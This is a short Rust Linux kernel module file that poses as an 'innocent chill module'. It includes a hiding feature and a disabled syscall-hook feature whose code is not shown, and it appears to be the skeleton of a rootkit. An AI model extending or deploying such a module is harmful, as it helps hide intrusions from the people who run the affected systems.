//! Innocent Rusty module
#![allow(unused)]
#![no_std]
use kernel::prelude::*;
use kernel::*;

module! {
    type: IRM,
    name: "irm",
    author: "Began Bajrami",
    description: "just a chill module",
    license: "GPL",
}
struct IRM;

#[cfg(disabled)]
include!("features/syscallhook.rs");

include!("features/hide.rs");

impl kernel::Module for IRM {
    fn init(_module: &'static ThisModule) -> Result<Self> {
        pr_info!("hey bud, wassup");
        Ok(IRM)
    }
}

impl Drop for IRM {
    fn drop(&mut self) {
        pr_info!("Why? Nobody likes me, I'm an Innocent chill module ;( \n");
    }
}
